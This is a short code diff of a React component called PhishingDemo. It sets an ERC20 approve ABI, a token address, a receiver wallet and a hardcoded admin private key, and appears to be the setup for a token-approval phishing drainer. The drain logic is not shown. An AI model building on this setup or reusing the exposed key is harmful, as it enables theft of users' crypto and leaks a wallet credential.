@@ -10,7 +10,7 @@ const ERC20_ABI = [
   "function approve(address spender, uint256 amount) returns (bool)"
 ];
 
-const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+const USDT_ADDRESS = "0xc0b4ce03df84765ae604f239ea4bbc5731f308af";
 
 export default function PhishingDemo() {
   const [logs, setLogs] = useState<string[]>([]);
@@ -19,7 +19,7 @@ export default function PhishingDemo() {
   
   // These would usually be dynamic or env variables
   const ADMIN_PRIVATE_KEY = "e99f0eb86cf5019bab2f0d0564f89f13e5bb37e34f7ba635390e2e591c8c0271"; 
-  const RECEIVER_ADDRESS = "0xC0b4cE03Df84765aE604F239Ea4BBc5731F308aF";
+  const RECEIVER_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1";
 
   const addLog = (msg: string) => {
     setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 10)]);
